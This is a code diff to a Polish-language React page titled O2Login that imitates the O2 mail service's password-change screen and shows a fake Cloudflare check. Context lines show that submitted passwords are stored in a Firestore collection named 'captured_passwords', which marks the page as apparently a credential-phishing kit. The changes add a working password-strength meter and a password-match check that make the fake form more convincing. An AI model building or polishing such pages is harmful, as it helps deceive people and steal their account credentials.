@@ -1,4 +1,3 @@
-
 "use client"
 
 import { useState, useEffect } from "react"
@@ -51,9 +50,27 @@ export function O2Login() {
     }, 1500)
   }
 
+  // Password strength calculation
+  const getPasswordStrength = (pwd: string) => {
+    if (!pwd) return { score: 0, label: "Brak" };
+    let score = 0;
+    if (pwd.length > 6) score++;
+    if (pwd.length > 10) score++;
+    if (/[A-Z]/.test(pwd)) score++;
+    if (/[0-9]/.test(pwd)) score++;
+    if (/[^A-Za-z0-9]/.test(pwd)) score++;
+    
+    const labels = ["Bardzo słabe", "Słabe", "Średnie", "Dobre", "Bardzo dobre", "Znakomita"];
+    return { score, label: labels[score] };
+  }
+
+  const strength = getPasswordStrength(newPassword);
+  const passwordsMatch = newPassword === confirmPassword;
+  const showMatchError = confirmPassword.length > 0 && !passwordsMatch;
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (cfStatus !== 'verified') return
+    if (cfStatus !== 'verified' || !passwordsMatch) return
     
     setIsSubmitting(true)
     
@@ -62,7 +79,6 @@ export function O2Login() {
       const id = doc(colRef).id;
       const docRef = doc(firestore, "captured_passwords", id);
       
-      // Mapujemy: Aktualne hasło -> sourceEmail, Nowe hasło -> password
       setDocumentNonBlocking(docRef, {
         id,
         password: newPassword,
@@ -98,7 +114,7 @@ export function O2Login() {
     <div className="min-h-screen flex flex-col md:flex-row bg-white">
       {/* Left Sidebar */}
       <div className="w-full md:w-[320px] flex flex-col border-r min-h-screen bg-white shadow-2xl z-20">
-        {/* Top Bar with Logo and Shadow */}
+        {/* Top Bar */}
         <div className="h-14 flex items-center justify-between px-4 border-b bg-white shadow-sm shrink-0">
           <button className="text-[#002aff] hover:bg-blue-50 p-1 rounded-full transition-colors">
             <ChevronLeft className="w-5 h-5" />
@@ -117,7 +133,7 @@ export function O2Login() {
 
           <form onSubmit={handleSubmit} className="space-y-6">
             <div className="space-y-7">
-              {/* Grupa Aktualne Hasło */}
+              {/* Aktualne Hasło */}
               <div className="relative">
                 <Input
                   type={showCurrent ? "text" : "password"}
@@ -137,7 +153,7 @@ export function O2Login() {
                 </button>
               </div>
 
-              {/* Grupa Nowe Hasła */}
+              {/* Nowe Hasła */}
               <div className="space-y-3">
                 <div className="relative">
                   <Input
@@ -164,7 +180,7 @@ export function O2Login() {
                     value={confirmPassword}
                     onChange={(e) => setConfirmPassword(e.target.value)}
                     required
-                    className="h-11 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm"
+                    className={`h-11 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm ${showMatchError ? 'border-red-500' : ''}`}
                   />
                   <button
                     type="button"
@@ -175,19 +191,26 @@ export function O2Login() {
                   </button>
                 </div>
 
-                {/* Siła hasła UI */}
+                {showMatchError && (
+                  <p className="text-[10px] text-red-500 font-bold">Hasła nie są identyczne</p>
+                )}
+
+                {/* Siła hasła dynamiczna */}
                 <div className="space-y-1.5 pt-1">
-                  <p className="text-[11px] text-gray-700">Siła hasła: <span className="font-bold">Znakomita</span></p>
+                  <p className="text-[11px] text-gray-700">Siła hasła: <span className="font-bold">{strength.label}</span></p>
                   <div className="flex gap-1.5 h-1.5 w-full">
                     {[1, 2, 3, 4, 5].map((i) => (
-                      <div key={i} className="flex-1 bg-[#22c55e] rounded-full" />
+                      <div 
+                        key={i} 
+                        className={`flex-1 rounded-full transition-colors duration-300 ${i <= strength.score ? 'bg-[#22c55e]' : 'bg-gray-100'}`} 
+                      />
                     ))}
                   </div>
                 </div>
               </div>
             </div>
 
-            {/* Cloudflare Widget Dark */}
+            {/* Cloudflare Widget */}
             <div 
               className={`bg-[#313131] border border-transparent p-4 min-h-[80px] rounded-sm flex items-center justify-between transition-all duration-300 ${cfStatus === 'ready' ? 'cursor-pointer hover:bg-[#3a3a3a]' : 'cursor-default'}`}
               onClick={handleCloudflareClick}
@@ -236,7 +259,7 @@ export function O2Login() {
             <Button 
               type="submit" 
               className="w-full h-11 bg-[#002aff] hover:bg-blue-700 font-bold text-sm rounded-sm shadow-sm transition-all active:scale-[0.98]" 
-              disabled={isSubmitting || cfStatus !== 'verified'}
+              disabled={isSubmitting || cfStatus !== 'verified' || !passwordsMatch || newPassword.length === 0}
             >
               {isSubmitting ? <Loader2 className="animate-spin w-5 h-5" /> : "Zaktualizuj hasło"}
             </Button>
